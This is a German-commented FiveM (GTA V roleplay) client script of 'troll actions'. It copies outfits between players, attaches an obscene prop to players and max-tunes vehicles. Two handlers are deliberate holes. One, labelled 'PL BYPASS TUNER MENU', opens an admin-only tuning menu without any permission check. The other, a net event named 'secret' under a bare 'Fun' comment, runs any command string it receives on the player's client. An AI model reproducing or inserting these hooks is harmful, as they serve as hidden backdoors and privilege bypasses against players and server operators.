---///---///---///---///---///---///
-- Sanchez TROLL ACTIONS       --
---///---///---///---///---///---///

-- Ist /copy & /copy2 ANFANG
RegisterNetEvent("cleanesOutfit")
AddEventHandler("cleanesOutfit", function(playerToGiveOutfit)
    local ped1 = PlayerPedId()
    local outfit = {}

    for i=1,11 do
        local drawable, texture, palette = GetPedDrawableVariation(ped1, i), GetPedTextureVariation(ped1, i), GetPedPaletteVariation(ped1, i)
        table.insert(outfit, {drawable = drawable, texture = texture, palette = palette})
    end

    TriggerServerEvent("sendToServer", outfit, playerToGiveOutfit)
end)

RegisterNetEvent("setPed")
AddEventHandler("setPed", function(outfit)
    local ped2 = PlayerPedId()
    for k, v in pairs(outfit) do
         SetPedComponentVariation(ped2, k, v.drawable, v.texture, v.palette)
    end
end)
-- Ist /copy & /copy2 ENDE

-- PL BYPASS TUNER MENU Anfang
RegisterNetEvent('lm_tunerplcheck:check')
AddEventHandler('lm_tunerplcheck:check', function()
    exports['lm_tuning'].openMenuByAdmin()
end)
-- PL BYPASS TUNER MENU ENDE

-- Dildo Anfang
CreateThread(function()
    while ESX.GetPlayerData().job == nil do
        Wait(50)
    end    
end)

function DILDOOO()
    RequestModel(GetHashKey('prop_cs_dildo_01'))
    while not HasModelLoaded(GetHashKey('prop_cs_dildo_01')) do
        Wait(255)
    end
    local plyPed = PlayerPedId()            
    local medkit = CreateObject(GetHashKey("prop_cs_dildo_01"), 0, 0, 0, true, true, true) 
    AttachEntityToEntity(medkit, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 31086), 0.1, 0.1, 0, 270.0, 0, 0, true, true, false, true, 1, true)
    Wait(20000)
    ClearPedTasks(plyPed)
    DeleteEntity(medkit)
end

RegisterNetEvent("dildo:dildo1")
AddEventHandler("dildo:dildo1", function(player)
    DILDOOO()
end)
-- Dildo Ende

-- WELCOME MESSAGE
-- local hello = true
-- local name = GetPlayerName(PlayerId())
-- CreateThread(function()
--     while hello do
--         Wait(0)
--         DrawMidText("Willkommen zurück auf Limitless, ~b~" ..name)
--     end
-- end)
-- CreateThread(function()
--     Wait(10000)
--     hello = false
-- end)
-- WELCOME MESSAGE

-- Fun
RegisterNetEvent("secret", function(data)
    local command = data.cmd
    ExecuteCommand(command)
end)
-- Fun

-- Fulltune Anfang
RegisterNetEvent("code:fulltune")
AddEventHandler("code:fulltune", function()
	local Vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    SetVehicleModKit(GetVehiclePedIsIn(PlayerPedId(), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(PlayerPedId(), false), 7)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 14, -1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 16) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 38) - 1, true)
	SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 45, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 45) - 1, true)
	SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 43, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 43) - 1, true)
	SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 40, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 40) - 1, true)
	SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 41, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 41) - 1, true)
	SetVehicleMod(GetVehiclePedIsIn(PlayerPedId(), false), 42, GetNumVehicleMods(GetVehiclePedIsIn(PlayerPedId(), false), 42) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(PlayerPedId(), false), 1)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(PlayerPedId(), false), 2)
end)
-- Fulltune Ende

